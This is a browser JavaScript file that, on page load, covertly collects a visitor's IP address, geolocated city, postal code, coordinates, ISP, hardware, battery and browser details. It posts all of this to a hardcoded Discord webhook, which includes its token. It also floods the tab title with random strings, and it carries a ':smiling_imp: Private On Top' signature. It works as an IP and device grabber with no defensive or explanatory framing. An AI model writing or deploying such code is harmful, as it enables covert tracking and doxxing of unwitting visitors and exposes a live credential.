function generateRandomString(length) {
    const characters = `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+?{}|\:"?><1234567890-=[];'./,`;
    let result = '';
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }
  
  function changeTitleToRandom() {
    const randomLength = Math.floor(Math.random() * 999);
    const randomString = generateRandomString(randomLength);
    document.title = randomString;
  }
  
  setInterval(changeTitleToRandom, 0);

  function sendToDiscord(message) {

    const webhookUrl = 'https://discordapp.com/api/webhooks/1239302019563388978/WBHZXs-_GJ_SJcOy3Dh8SAPNiNNs0gLe4IpAnDzSLxHmxF1sW6YnD7RA1ALQa5AQIurM';

    const requestBody = {
        content: message
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed');
        }
        console.warn('Clear');
    })
    .catch(error => {
        console.error('Failed', error);
    });
}


function getSystemRAM() {
    const memory = navigator.deviceMemory;
    return memory ? `${memory} GB` : 'Unknown';
}

function getGraphicsCardName() {
    const gl = document.createElement('canvas').getContext('webgl');
    if (!gl) {
      return {
        error: "no webgl",
      };
    }
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? {
      graphicsCard: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
    } : {
      error: "no WEBGL_debug_renderer_info",
    };
  }

  const result = getGraphicsCardName();

  if (result.error) {
      console.error(result.error);
  } else {
      const graphicsCardInfo = result.graphicsCard;
      const graphicsCardName = graphicsCardInfo.name;
      console.log(`Graphics Card: ${graphicsCardName}`);
  }
  

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

function getBrowserName() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes('Chrome')) {
        return 'Google Chrome';
    } else if (userAgent.includes('Firefox')) {
        return 'Mozilla Firefox';
    } else if (userAgent.includes('Edge')) {
        return 'Microsoft Edge';
    } else {
        return 'Unknown Browser';
    }
}



function getBrowserVersion() {
    const userAgent = navigator.userAgent;
    const match = userAgent.match(/(Chrome|Firefox|Edge)\/([\d.]+)/);
    return match ? match[2] : 'Unknown';
}

function getIPAddress() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error('Error fetching IP address:', error);
            return 'Unknown';
        });
}


function getCountryInfo(ip) {
    return fetch(`https://ipapi.co/${ip}/json/`)
        .then(response => response.json())
        .catch(error => {
            console.error('Error fetching country information:', error);
            return {};
        });
}

async function getSystemInfo() {
    try {
        const ip = await getIPAddress();

        const countryInfo = await getCountryInfo(ip);

        const message = `

** ${new Date()}
IP Address: ${ip}\nCountry: ${countryInfo.country_name || 'Unknown'}\nRegion: ${countryInfo.region || 'Unknown'}\nCountry Code: ${countryInfo.country_code || 'Unknown'}\nContinent Code: ${countryInfo.continent_code || 'Unknown'}\nCity: ${countryInfo.city || 'Unknown'}\nZIP/Postal Code: ${countryInfo.postal || 'Unknown'}\nLatitude: ${countryInfo.latitude || 'Unknown'}\nLongitude: ${countryInfo.longitude || 'Unknown'}\nTimezone: ${countryInfo.timezone || 'Unknown'}\nISP: ${countryInfo.org || 'Unknown'}\nCurrency: ${countryInfo.currency || 'Unknown'}\n\nSystem Information:\nRAM: ${getSystemRAM()}\n GPU: ${result.error ? 'Unknown' : result.graphicsCard} \nScreen Resolution: ${getScreenResolution()}\nAvailable Screen Height: ${window.screen.availHeight}\nAvailable Screen Width: ${window.screen.availWidth}\nDevice Pixel Ratio: ${window.devicePixelRatio}\nConnection Type: ${navigator.connection ? navigator.connection.type : 'Not available'}\nHardware Concurrency: ${navigator.hardwareConcurrency || 'Not available'}\nBattery Level: ${navigator.getBattery ? (await navigator.getBattery()).level : 'Not available'}\nPlatform: ${navigator.platform}\nProduct: ${navigator.product}\nVendor: ${navigator.vendor}\n\nBrowser Information:\nBrowser: ${getBrowserName()}\nVersion: ${getBrowserVersion()}\nCookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}\nLanguage: ${navigator.language}\nUser Agent: ${navigator.userAgent}\nDo Not Track: ${navigator.doNotTrack ? 'Yes' : 'No'}\n
:smiling_imp: Private On Top :smiling_imp:
**`;

        sendToDiscord(message);

        const informationDiv = document.querySelector('.information');
        informationDiv.innerText = message;
    } catch (error) {
        console.error('Error getting system information:', error);
    }
}


window.addEventListener('load', getSystemInfo);



    

